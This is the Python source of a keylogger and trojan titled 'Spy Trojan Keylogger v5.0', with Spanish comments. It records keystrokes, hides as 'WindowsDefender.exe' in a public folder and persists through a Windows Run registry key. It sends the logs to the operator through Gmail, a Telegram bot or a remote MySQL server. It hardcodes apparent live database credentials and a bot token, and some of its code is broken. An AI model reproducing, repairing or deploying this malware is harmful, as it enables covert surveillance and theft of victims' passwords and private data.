# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝

# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.0

#region import Libs
from pynput.keyboard import Listener
from getpass import getuser     # Obtiene el nombre del usuario
from datetime import datetime   # Devuelve fecha y hora actual
from winreg import *            # Modifica registros de Windows
import datetime                 # Devuelve fecha y hora actual
import random                   # Genera numeros
import os                       # Lib para copiar archivos
import telebot                  # Telegram API
import yagmail                  # Enviar archivos solo a Gmail
import pymysql                  # Lib connection mysql
import shutil                   # Lib para crear carpetas
import string                   # Lib genera textos
import time
import threading                # Hilos
import socket                   # Librería verifica internet
#endregion






class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_OCULT+self.NAME_KEY                               # <No cambiar>
        self.PATH_LOG = self.LOG_KEY_PATH+self.LOG_NAME
        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
        self.LOG_NAME = "reg"+ "." + "k"                                            # Nombre y extensión del registro
        # Importante
        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
        self.MODE = 2     # 0 = Gmail
                          # 1 = DataBase                                            # Solo se puede usar una opción
                          # 2 = TelegramBot
    class DataBase:  # Clase de Base de datos
        def __init__(self):
            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
            self.PORT     = "3306"                                                  # Port
    class Gmail:
        def __init__(self):
            self.GMAIL_1 = "correo1@gmail.com"
            self.PASS_1  = "password1"
            self.GMAIL_2 = "correo2@gmail.com"
            self.PASS_2  = "password2"
            self.GMAIL_3 = "correo3@gmail.com"
            self.PASS_3  = "password3"
          # Solo un correo Recibirá el Registro de Teclas
            self.RECEIVERS = ["receivers1@yahoo.com"]
          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
    class TelegramBot:
        def __init__(self):
            self.ID   = 831756900                                                     # ID Principal [Obligatorio]
            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]


class Functions:
    def CheckFolder_StartUP(self):  # Función especial para el startUp
        try:    # Intenta crear la dirección
            os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
            return True     # Se creó la carpeta
        except:
            return False    # La carpeta ya existe
        pass

    def RandomChar(self,y=100):
        return ''.join(random.choice(string.ascii_letters) for x in range(y))

    # Función = Verifica si hay conexión a internet para poder envíar el log
    def VerifyConnection(self):
        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
        try:                                                            # Intenta conectarse al servidor de Google
            con.connect(('www.google.com', 80))
            con.close()
            print("[Test Internet] => [OK]")
            return True
        except:
            print("[Test Internet] => [NO]")
            return False
    def SendGmail(self, file, email, password, receiver_email):
        try:
            f = datetime.datetime.now()
            subject = "Data User: " + str(getuser())
            # Inicia Sesión
            yag = yagmail.SMTP(user=email, password=password)
            informacion = "\nFecha: " + f.strftime("%A") + " " + f.strftime("%d") + " de " + f.strftime(
                "%B") + "\nHora: " + f.strftime("%I") + ":" + f.strftime("%M") + " " + f.strftime(
                "%p") + " con " + f.strftime("%S") + " Segundos"
            # Cuerpo del mensaje
            contents = [
                "Información:\n\nNombre de Usuario: " + str(getuser()) + informacion
            ]
            yag.send(receiver_email, subject, contents, attachments=file)
            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
            return True
        except:
            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
            return False



class Util:
    def __init__(self): #Constructor?
        pass
    def CreateFolders(self):    # Crea el directorio oculto
        try:  # Intenta crear la dirección
            os.makedirs(Config().PATH_OCULT)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_OCULT)
        except:
            print("[CreateFolders] - La carpeta ya existe: "+ Config().PATH_OCULT)
        try:  # Intenta crear la dirección del registro de teclas..
            os.makedirs(Config().PATH_KEY)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
        except:
            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)

    def RenameFileKey(self,name): # Renombre el archivo log, antes de ser envíado
        try:
            self.CreateFolders()  # Crea el directorios [Evita posibles errores]
            # Copia el archivo
            path = Config().LOG_KEY_PATH+ name
            os.rename(Config().PATH_LOG, path)
            print("El archivo reg.k se renombró correctamente")
        except:
            print("No se puedo renombrar el archivo 'reg.k' ")
            pass

    def addStartUp(self):
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:    # Solo si tiene permisos de administrador
            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
            SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
            Functions.CheckFolder_StartUP() # Crea carpeta
        except:
            if Functions.CheckFolder_StartUP():
                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
    def Trojan(self):   # Se Replica en el sistema
        self.CreateFolders()
        try:
            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
        except:
            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
            try:
                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
                print("\n[Trojan] - Se replico en el sistema correctamente")
            except:
                print("\n[Trojan] - Hubo un problema al replicar en el sistema")

    # Envía los datos reg.k vía Gmail
    def SendGmail(self):
        # Crea nombre del archivo
        nameFile = str(getuser()) + "-" + Functions().RandomChar(12) + ".txt"
        # Renombra el archivo original
        self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`

        # Envía el archivo renombrado
        self.CreateFolders()
        homedir = Config().LOG_KEY_PATH + str(nameFile)
        print("[Gmail send] Proceso de envío...")

        if Functions.SendGmail(homedir, Config.Gmail().GMAIL_1, Config.Gmail().PASS_1, Config.Gmail().RECEIVERS):
            os.remove(homedir)

        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_2, Config.Gmail().PASS_2, Config.Gmail().RECEIVERS):
            os.remove(homedir)

        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_3, Config.Gmail().PASS_3, Config.Gmail().RECEIVERS):
            os.remove(homedir)

    def TelegramBot(self):
        try:
            print("[TelegramBot] Proceso...")
            pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
            os.rename(Config().PATH_LOG, pathN)
            # Abre el archivo
            f = open(pathN, 'r')
            T = datetime.datetime.now()
            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
                "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
            def SendT(ID):
                bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
                bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(ID))
            try:
                if Config.TelegramBot().ID_2 != 000000000:
                    SendT(Config.TelegramBot().ID)

                if Config.TelegramBot().ID_2 != 000000000:
                    SendT(Config.TelegramBot().ID_2)

                if Config.TelegramBot().ID_3 != 000000000:
                    SendT(Config.TelegramBot().ID_3)

                f.close()
                os.remove(pathN)
                print("[TelegramBot] Se eliminó el archivo caché correctamente")
            except:
                print("[Telegram] Error al subir el registro")
        except:
            try:
                f.close()
                os.remove(pathN)  # Borra la carpeta por posible Errores
            except:
                pass
            print("[Telegram] No se encuentra el archivo")

    def MySQL(self):
        exito = False
        try:  # Verifica si se inició corectamente
            connection = pymysql.connect(
                host=Config.DataBase().HOSTNAME,
                user=Config.DataBase().USERNAME,
                password=Config.DataBase().PASSWORD,
                database=Config.DataBase().DATABASE)
            cursor = connection.cursor()  # Objeto cursor
            print("Se inició correctamente ")
            exito = True
        except:
            exito = False
            print("Error al iniciar sesión [DataBase]")

        def UpdateUser():
            try:
                pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
                os.rename(Config().PATH_LOG, pathN)
                # Abre el archivo
                f = open(pathN, 'r')
                data = f.read()
                f.close()
                print(data)
                # Tiempo
                T = datetime.datetime.now()
                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
                    "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
                try:
                    cursor.execute(sql, (str(getuser()), currentTime, data))  # Ejecuta virtual
                    connection.commit()  # Se guardan virtual
                    print("[Database] Se subieron los datos correctamente")
                    # Elimina Registro Key
                    connection.close()
                    os.remove(pathN)
                except:
                    print("[Database] Error al subir los datos")

            except:
                try:
                    os.remove(pathN)  # Borra la carpeta por posible Errores
                except:
                    pass
                print("[DataBase] No se encuentra el archivo")

        if (exito):  # Solo se ejecutará si se inició correctamente la base de datos
            UpdateUser()
        # print("[DataBase]=> "+str(exito))





##print(str());







